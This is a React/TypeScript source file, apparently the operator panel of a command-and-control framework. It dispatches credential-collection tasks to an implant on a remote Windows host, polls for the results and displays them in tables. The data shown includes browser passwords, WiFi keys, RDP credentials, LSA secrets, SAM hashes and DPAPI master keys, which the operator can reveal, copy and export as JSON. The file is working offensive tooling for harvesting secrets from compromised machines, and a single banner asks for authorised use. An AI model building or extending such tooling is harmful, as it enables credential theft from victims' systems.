import { useCallback, useEffect, useRef, useState } from 'react'
import { KeyRound, Eye, EyeOff, Copy, Download, RefreshCw, AlertTriangle, CheckCircle2, Clock } from 'lucide-react'
import type { Session } from '../types'
import { credentialApi } from '../api'

interface CredentialsPanelProps {
  session: Session
}

/** 单条凭据（各类 action 的字段并集：分段后前端按 action 选列渲染）。 */
interface CredentialEntry {
  type?: string
  browser?: string; url?: string; username?: string; password?: string
  ssid?: string; target_name?: string; name?: string; source?: string
  encrypted_data?: string; plaintext?: string; encrypted_old_data?: string
  data?: string; is_rdp?: string; error?: string; target?: string
  sid?: string; file_name?: string; file_path?: string; file_size?: string; mod_time?: string
}

/**
 * 凭据结果的一段（一个 action 一段，植入端保证每段 ≤ 64 KiB）。
 *
 * 字段口径与服务端/植入端一致（internal/server/builder/implant/credentials_windows.go）：
 *   count=收集总数 returned=实际返回数 omitted=因段上限被丢弃数 bytes=该段完整 JSON 字节数
 *   truncated=该段是否被截断 error=该段失败原因 needs_admin=非管理员+管理员专属能力
 */
interface CredentialSegment {
  action?: string
  label?: string
  count?: number
  returned?: number
  omitted?: number
  bytes?: number
  truncated?: boolean
  needs_admin?: boolean
  error?: string
  data?: CredentialEntry[]
}

interface CredentialResults {
  action?: string
  elevated?: boolean
  duration_ms?: number
  total_count?: number
  returned_count?: number
  truncated?: boolean
  notes?: string[]
  browser?: CredentialSegment
  wifi?: CredentialSegment
  rdp?: CredentialSegment
  lsa?: CredentialSegment
  sam?: CredentialSegment
  dpapi?: CredentialSegment
}

interface TaskDetail {
  status?: string
  output?: string
  error?: string
  exit_code?: number
  output_raw_bytes?: number
  truncated?: boolean
  output_bytes_original?: number
  output_max_bytes?: number
  output_bytes?: number
}

/** 轮询总超时：与后端 credentialsPollTimeoutSec（200s）对齐，绝不无限转圈。 */
const CREDENTIALS_POLL_TIMEOUT_MS = 200_000
/** 轮询间隔（前几次快速探测，之后拉长）。 */
const POLL_INTERVALS = [0, 200, 300, 500, 800, 1200, 2000]
/** 单次 GET /tasks/{id} 的超时，避免一次卡住的请求吃掉总预算。 */
const POLL_REQUEST_TIMEOUT_MS = 10_000

type Phase = 'idle' | 'dispatched' | 'running' | 'done' | 'timeout' | 'error'

const SEGMENT_ORDER: Array<'browser' | 'wifi' | 'rdp' | 'lsa' | 'sam' | 'dpapi'> = [
  'browser', 'wifi', 'rdp', 'lsa', 'sam', 'dpapi',
]

const SEGMENT_LABELS: Record<string, string> = {
  browser: '浏览器密码',
  wifi: 'WiFi 密码',
  rdp: 'RDP / 凭据管理器',
  lsa: 'LSA Secrets',
  sam: 'SAM 哈希',
  dpapi: 'DPAPI 主密钥',
}

function sleep(ms: number) {
  return new Promise((r) => setTimeout(r, ms))
}

/** 把服务端错误原文取出来（axios 错误 / 纯文本 / 未知异常），绝不吞成"请求失败"。 */
function extractServerError(err: any): string {
  const body = err?.response?.data
  if (typeof body === 'string' && body.trim()) {
    try {
      const parsed = JSON.parse(body)
      if (parsed?.error) return String(parsed.error)
    } catch { /* 非 JSON：原样展示 */ }
    return body
  }
  if (body && typeof body === 'object') {
    if (body.error) return String(body.error)
    if (body.message) return String(body.message)
  }
  if (err?.message) return String(err.message)
  return '请求失败（服务端未返回原因）'
}

/** 轮询结果：done=任务终态，timeout=总超时（任务可能仍在执行），error=请求层失败。 */
interface PollOutcome {
  kind: 'done' | 'timeout' | 'error'
  task?: TaskDetail
  error?: string
  elapsedMs: number
}

/** 单次 GET /tasks/{id}：带超时；非 2xx 时把服务端原文一并带回（不吞错误）。 */
async function fetchTaskOnce(
  taskId: number,
  timeoutMs: number,
): Promise<{ ok: boolean; status: number; task?: TaskDetail; errorText?: string }> {
  const token = localStorage.getItem('toshell-token')
  const ctrl = new AbortController()
  const timer = setTimeout(() => ctrl.abort(), Math.max(1500, timeoutMs))
  try {
    const resp = await fetch(`/api/v1/tasks/${taskId}`, {
      headers: token ? { Authorization: `Bearer ${token}` } : undefined,
      signal: ctrl.signal,
    })
    const text = await resp.text()
    if (!resp.ok) {
      let msg = text
      try {
        const parsed = JSON.parse(text)
        if (parsed?.error) msg = String(parsed.error)
      } catch { /* 非 JSON：原样展示 */ }
      return { ok: false, status: resp.status, errorText: msg || `HTTP ${resp.status}` }
    }
    try {
      return { ok: true, status: resp.status, task: JSON.parse(text) as TaskDetail }
    } catch {
      return { ok: false, status: resp.status, errorText: `任务详情不是合法 JSON：${text.slice(0, 300)}` }
    }
  } finally {
    clearTimeout(timer)
  }
}

/**
 * 带总超时的轮询：200s 到点必定返回（timeout 分支），不再无限转圈。
 * 阶段回调让界面能显示"已下发/执行中"和已等待时长。
 */
async function pollTaskResult(
  taskId: number,
  onProgress: (elapsedMs: number) => void,
): Promise<PollOutcome> {
  const startedAt = Date.now()
  let lastErr = ''
  for (let i = 0; ; i++) {
    const elapsed = Date.now() - startedAt
    if (elapsed >= CREDENTIALS_POLL_TIMEOUT_MS) {
      return { kind: 'timeout', elapsedMs: elapsed, error: lastErr }
    }
    try {
      const res = await fetchTaskOnce(
        taskId,
        Math.min(POLL_REQUEST_TIMEOUT_MS, CREDENTIALS_POLL_TIMEOUT_MS - elapsed),
      )
      if (!res.ok) {
        // 404 = 任务已不存在（被清理）：直接结束，把服务端原文交给界面
        if (res.status === 404) {
          return { kind: 'error', error: res.errorText, elapsedMs: Date.now() - startedAt }
        }
        lastErr = res.errorText || lastErr
      } else {
        const t = res.task || {}
        const status = String(t.status || '').toLowerCase()
        if (status === 'completed' || status === 'failed' || status === 'timeout') {
          return { kind: 'done', task: t, elapsedMs: Date.now() - startedAt }
        }
        onProgress(Date.now() - startedAt)
      }
    } catch (err: any) {
      // axios 之外的网络错误/中止：先记下，继续轮询到总超时（界面不会卡死）
      lastErr = err?.name === 'AbortError' ? '单次轮询请求超时' : (err?.message || String(err))
    }
    await sleep(POLL_INTERVALS[Math.min(i, POLL_INTERVALS.length - 1)])
  }
}

async function copyToClipboard(text: string) {
  try { await navigator.clipboard.writeText(text) } catch {
    const ta = document.createElement('textarea'); ta.value = text
    document.body.appendChild(ta); ta.select(); document.execCommand('copy')
    document.body.removeChild(ta)
  }
}

function formatBytes(n?: number): string {
  if (!n || n <= 0) return '0 B'
  if (n < 1024) return `${n} B`
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KiB`
  return `${(n / (1024 * 1024)).toFixed(2)} MiB`
}

export function CredentialsPanel({ session }: CredentialsPanelProps) {
  const [action, setAction] = useState('all')
  const [loading, setLoading] = useState(false)
  const [phase, setPhase] = useState<Phase>('idle')
  const [stageText, setStageText] = useState('')
  const [elapsedMs, setElapsedMs] = useState(0)
  const [results, setResults] = useState<CredentialResults | null>(null)
  const [serverError, setServerError] = useState('')
  const [rawOutput, setRawOutput] = useState('')
  const [visiblePasswords, setVisiblePasswords] = useState<Set<string>>(new Set())
  const [copiedLabel, setCopiedLabel] = useState('')
  const [lastTaskId, setLastTaskId] = useState<number | null>(null)
  const mountedRef = useRef(true)

  useEffect(() => {
    mountedRef.current = true
    return () => { mountedRef.current = false }
  }, [])

  const togglePassword = (id: string) => {
    setVisiblePasswords(prev => {
      const next = new Set(prev)
      if (next.has(id)) next.delete(id); else next.add(id)
      return next
    })
  }

  const handleCopy = useCallback(async (text: string, label: string) => {
    await copyToClipboard(text)
    setCopiedLabel(label)
    setTimeout(() => setCopiedLabel(''), 2000)
  }, [])

  const handleCollect = async () => {
    setLoading(true)
    setPhase('dispatched')
    setStageText('已下发：正在把凭据收集任务推送给植入端…')
    setElapsedMs(0)
    setResults(null)
    setServerError('')
    setRawOutput('')
    setLastTaskId(null)

    try {
      const resp = await credentialApi.collect(session.id, action)
      const data = (resp as any)?.data || {}
      const taskId: number | undefined = data.task_id
      if (!taskId) {
        throw new Error(`服务端未返回 task_id（原文：${JSON.stringify(data)}）`)
      }
      setLastTaskId(taskId)
      setPhase('running')
      setStageText(`已下发任务 #${taskId}，等待植入端执行…`)

      const outcome = await pollTaskResult(taskId, (elapsed) => {
        if (!mountedRef.current) return
        setElapsedMs(elapsed)
        setStageText(`执行中：任务 #${taskId}，已等待 ${Math.floor(elapsed / 1000)}s / ${CREDENTIALS_POLL_TIMEOUT_MS / 1000}s`)
      })
      if (!mountedRef.current) return
      setElapsedMs(outcome.elapsedMs)

      if (outcome.kind === 'timeout') {
        setPhase('timeout')
        setStageText(
          `已等待 ${Math.floor(CREDENTIALS_POLL_TIMEOUT_MS / 1000)}s 仍未返回：任务 #${taskId} 可能仍在执行，` +
          '请稍后回看任务列表（凭据 dump 可能较慢；植入端重活超时为 180s）。',
        )
        if (outcome.error) setServerError(outcome.error)
        return
      }
      if (outcome.kind === 'error') {
        setPhase('error')
        setServerError(outcome.error || '轮询任务失败')
        setStageText(`轮询失败：任务 #${taskId}`)
        return
      }

      const task = outcome.task || {}
      const status = String(task.status || '').toLowerCase()
      const taskError = (task.error || '').trim()
      if (taskError) setServerError(taskError)

      // 失败任务也可能带回可解析的分段结果（例如 LSA 无权限：output 有分段 JSON、
      // error 写"需要管理员权限"）：先尝试解析 output，再决定展示形态。
      const output = task.output || ''
      let parsed: CredentialResults | null = null
      if (output.trim()) {
        try {
          parsed = JSON.parse(output) as CredentialResults
        } catch {
          parsed = null
        }
      }

      if (parsed) {
        setResults(parsed)
        if (status === 'completed' && !taskError) {
          setPhase('done')
          setStageText(`已完成：任务 #${taskId}（耗时 ${outcome.elapsedMs}ms）`)
        } else {
          setPhase('error')
          setStageText(`任务结束（状态 ${status}）：已展示分段结果，错误见下方服务端原文`)
        }
      } else if (output.trim()) {
        // 不是预期的 JSON（老载荷/非 Windows 的英文错误文本等）：原样展示，不吞。
        setRawOutput(output)
        setPhase(status === 'completed' ? 'done' : 'error')
        setStageText(`任务结束（状态 ${status}）：返回内容不是分段 JSON，已原样展示`)
      } else if (status === 'completed' && !taskError) {
        setPhase('error')
        setServerError('服务端返回 completed，但结果是空字符串（没有可解析的分段结果）')
        setStageText(`任务 #${taskId} 已完成但结果为空`)
      } else {
        setPhase('error')
        setStageText(`任务失败（状态 ${status}）`)
        if (!taskError) setServerError('任务失败，但服务端未返回错误文本')
      }
    } catch (err: any) {
      if (!mountedRef.current) return
      setPhase('error')
      setServerError(extractServerError(err))
      setStageText('下发失败')
    } finally {
      if (mountedRef.current) setLoading(false)
    }
  }

  const handleExportJSON = () => {
    if (!results) return
    const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url; a.download = `credentials_${session.hostname}_${Date.now()}.json`
    a.click(); URL.revokeObjectURL(url)
  }

  const renderPasswordCell = (password: string, id: string) => {
    if (!password) return <span className="cred-empty">-</span>
    const visible = visiblePasswords.has(id)
    return (
      <span className="cred-password-cell">
        <code className={visible ? '' : 'cred-blur'}>{visible ? password : '****'}</code>
        <button className="cred-icon-btn" onClick={() => togglePassword(id)} title={visible ? '隐藏' : '显示'}>
          {visible ? <EyeOff size={13} /> : <Eye size={13} />}
        </button>
        <button className="cred-icon-btn" onClick={() => handleCopy(password, id)} title="复制">
          <Copy size={13} />
        </button>
        {copiedLabel === id && <span className="cred-copied">已复制</span>}
      </span>
    )
  }

  const segId = (key: string) => `cred-${key}-`

  const renderBrowserTable = (seg: CredentialSegment) => (
    <table className="cred-table">
      <thead><tr><th>URL</th><th>用户名</th><th>密码</th><th>浏览器</th></tr></thead>
      <tbody>
        {(seg.data || []).map((e, i) => (
          <tr key={i}>
            <td className="cred-url">{e.url || '-'}</td>
            <td>{e.username || '-'}</td>
            <td>{renderPasswordCell(e.password || '', `${segId('browser')}${i}`)}</td>
            <td><span className="cred-tag">{e.browser || '-'}</span></td>
          </tr>
        ))}
      </tbody>
    </table>
  )

  const renderWiFiTable = (seg: CredentialSegment) => (
    <table className="cred-table">
      <thead><tr><th>SSID</th><th>密码</th></tr></thead>
      <tbody>
        {(seg.data || []).map((e, i) => (
          <tr key={i}>
            <td className="cred-ssid">{e.ssid || e.name || '-'}</td>
            <td>{renderPasswordCell(e.password || '', `${segId('wifi')}${i}`)}</td>
          </tr>
        ))}
      </tbody>
    </table>
  )

  const renderRDPTable = (seg: CredentialSegment) => (
    <table className="cred-table">
      <thead><tr><th>目标</th><th>用户名</th><th>密码</th><th>类型</th></tr></thead>
      <tbody>
        {(seg.data || []).map((e, i) => (
          <tr key={i}>
            <td className="cred-url">{e.target_name || e.target || '-'}</td>
            <td>{e.username || '-'}</td>
            <td>{renderPasswordCell(e.password || '', `${segId('rdp')}${i}`)}</td>
            <td><span className="cred-tag">{e.type || '-'}</span></td>
          </tr>
        ))}
      </tbody>
    </table>
  )

  const renderLSATable = (seg: CredentialSegment) => (
    <table className="cred-table">
      <thead><tr><th>名称</th><th>明文</th><th>加密数据 (hex)</th></tr></thead>
      <tbody>
        {(seg.data || []).map((e, i) => (
          <tr key={i}>
            <td>{e.name || e.source || '-'}</td>
            <td>{renderPasswordCell(e.plaintext || e.data || '', `${segId('lsa')}${i}`)}</td>
            <td className="cred-mono">{e.encrypted_data ? e.encrypted_data.substring(0, 40) + '...' : '-'}</td>
          </tr>
        ))}
      </tbody>
    </table>
  )

  const renderSAMTable = (seg: CredentialSegment) => (
    <table className="cred-table">
      <thead><tr><th>用户名</th><th>类型</th><th>来源</th><th>数据</th></tr></thead>
      <tbody>
        {(seg.data || []).map((e, i) => (
          <tr key={i}>
            <td className="cred-ssid">{e.username || '-'}</td>
            <td><span className="cred-tag">{e.type || '-'}</span></td>
            <td>{e.source || '-'}</td>
            <td className="cred-mono">{e.data ? e.data.substring(0, 48) + '...' : '-'}</td>
          </tr>
        ))}
      </tbody>
    </table>
  )

  const renderDPAPITable = (seg: CredentialSegment) => (
    <table className="cred-table">
      <thead><tr><th>文件</th><th>SID</th><th>大小</th><th>修改时间</th></tr></thead>
      <tbody>
        {(seg.data || []).map((e, i) => (
          <tr key={i}>
            <td className="cred-url">{e.file_name || e.file_path || '-'}</td>
            <td className="cred-mono">{e.sid || '-'}</td>
            <td>{e.file_size ? formatBytes(Number(e.file_size)) : '-'}</td>
            <td className="cred-mono">{e.mod_time || '-'}</td>
          </tr>
        ))}
      </tbody>
    </table>
  )

  const renderSegment = (key: string, seg: CredentialSegment) => {
    const table =
      key === 'browser' ? renderBrowserTable(seg) :
      key === 'wifi' ? renderWiFiTable(seg) :
      key === 'rdp' ? renderRDPTable(seg) :
      key === 'lsa' ? renderLSATable(seg) :
      key === 'sam' ? renderSAMTable(seg) :
      renderDPAPITable(seg)
    const hasRows = (seg.data || []).length > 0
    return (
      <div className="cred-section" key={key}>
        <h4 className="cred-section-title">
          {seg.label || SEGMENT_LABELS[key] || key}
          <span className="cred-badge">{seg.count ?? 0} 条</span>
          {typeof seg.bytes === 'number' && <span className="cred-badge cred-badge-muted">{formatBytes(seg.bytes)}</span>}
          {seg.truncated && (
            <span className="cred-badge cred-badge-warn" title={seg.omitted ? `因单段 64 KiB 上限丢弃 ${seg.omitted} 条` : '结果已截断'}>
              truncated{seg.omitted ? `（丢弃 ${seg.omitted} 条）` : ''}
            </span>
          )}
          {seg.needs_admin && <span className="cred-badge cred-badge-warn">需要管理员权限</span>}
        </h4>
        {seg.error && <div className="cred-error"><AlertTriangle size={13} />{seg.error}</div>}
        {hasRows ? table : (!seg.error && <div className="cred-empty">该段未找到记录</div>)}
        {typeof seg.returned === 'number' && seg.returned !== seg.count && (
          <div className="cred-seg-note">本段返回 {seg.returned} / {seg.count} 条（其余因分段上限丢弃）</div>
        )}
      </div>
    )
  }

  const totalCount = results
    ? (typeof results.total_count === 'number'
        ? results.total_count
        : SEGMENT_ORDER.reduce((sum, k) => sum + (results[k]?.count || 0), 0))
    : 0
  const returnedCount = results
    ? (typeof results.returned_count === 'number'
        ? results.returned_count
        : SEGMENT_ORDER.reduce((sum, k) => sum + (results[k]?.returned ?? results[k]?.data?.length ?? 0), 0))
    : 0
  const hasAnySegment = !!results && SEGMENT_ORDER.some((k) => !!results[k])

  const progressPct = Math.min(100, Math.round((elapsedMs / CREDENTIALS_POLL_TIMEOUT_MS) * 100))

  const stageIndex = phase === 'done' ? 2 : (phase === 'running' ? 1 : (phase === 'dispatched' ? 0 : -1))

  return (
    <div className="credentials-panel">
      <div className="cred-toolbar">
        <div className="cred-toolbar-left">
          <KeyRound size={18} />
          <span className="cred-title">凭据收集 — {session.hostname}</span>
        </div>
        <div className="cred-toolbar-right">
          <select className="cred-select" value={action} onChange={(e) => setAction(e.target.value)} disabled={loading}>
            <option value="all">全部</option>
            <option value="browser">浏览器密码</option>
            <option value="wifi">WiFi 密码</option>
            <option value="rdp">RDP 凭据</option>
            <option value="lsa">LSA Secrets</option>
            <option value="sam">SAM 哈希</option>
            <option value="dpapi">DPAPI 主密钥</option>
          </select>
          <button className="cred-collect-btn" onClick={handleCollect} disabled={loading}>
            {loading ? <><RefreshCw size={14} className="cred-spin" /> 收集...</> : <><KeyRound size={14} /> 收集凭据</>}
          </button>
          {results && (
            <button className="cred-export-btn" onClick={handleExportJSON} title="导出 JSON">
              <Download size={14} />
            </button>
          )}
        </div>
      </div>

      <div className="cred-notice">
        <AlertTriangle size={14} />
        <span>凭据收集操作会读取目标系统上保存的密码和凭据信息。可能触发安全软件告警，请在授权范围内使用。</span>
      </div>

      {phase !== 'idle' && (
        <div className="cred-stage-wrap">
          <div className="cred-stages">
            {['已下发', '执行中', '已完成'].map((label, i) => (
              <span key={label} className={`cred-stage ${stageIndex >= i ? 'cred-stage-on' : ''} ${phase === 'timeout' && i === 1 ? 'cred-stage-warn' : ''}`}>
                {phase === 'done' && i === 2 ? <CheckCircle2 size={12} /> : <Clock size={12} />}
                {label}
              </span>
            ))}
          </div>
          {(phase === 'running' || phase === 'dispatched') && (
            <div className="cred-progress" title={`${Math.floor(elapsedMs / 1000)}s / ${CREDENTIALS_POLL_TIMEOUT_MS / 1000}s`}>
              <div className="cred-progress-bar" style={{ width: `${Math.max(2, progressPct)}%` }} />
            </div>
          )}
        </div>
      )}

      {stageText && (
        <div className={`cred-status ${phase === 'timeout' || phase === 'error' ? 'cred-status-warn' : ''}`}>
          {stageText}
          {lastTaskId !== null && phase !== 'done' && (
            <span className="cred-task-id">任务 #{lastTaskId}</span>
          )}
        </div>
      )}

      {serverError && (
        <div className="cred-error cred-error-block">
          <AlertTriangle size={13} />
          <div>
            <div className="cred-error-label">服务端错误原文</div>
            <pre className="cred-error-text">{serverError}</pre>
          </div>
        </div>
      )}

      {rawOutput && (
        <div className="cred-section">
          <h4 className="cred-section-title">原始返回（非分段 JSON）</h4>
          <pre className="cred-error-text">{rawOutput}</pre>
        </div>
      )}

      {results?.notes?.map((n, i) => (
        <div className="cred-note" key={i}><AlertTriangle size={12} />{n}</div>
      ))}

      {hasAnySegment && SEGMENT_ORDER.map((key) => {
        const seg = results?.[key]
        return seg ? renderSegment(key, seg) : null
      })}

      {results && totalCount === 0 && !serverError && phase === 'done' && (
        <div className="cred-empty">未找到任何凭据信息（各分段均为 0 条）</div>
      )}

      {results && (
        <div className="cred-footer">
          共收集到 {totalCount} 条凭据记录
          {returnedCount !== totalCount && `（实际返回 ${returnedCount} 条，其余被分段上限截断）`}
          {typeof results.duration_ms === 'number' && ` · 植入端耗时 ${results.duration_ms}ms`}
          {typeof results.elevated === 'boolean' && ` · 权限：${results.elevated ? '管理员' : '普通用户'}`}
          {results.truncated && ' · 存在被截断的分段'}
        </div>
      )}
    </div>
  )
}
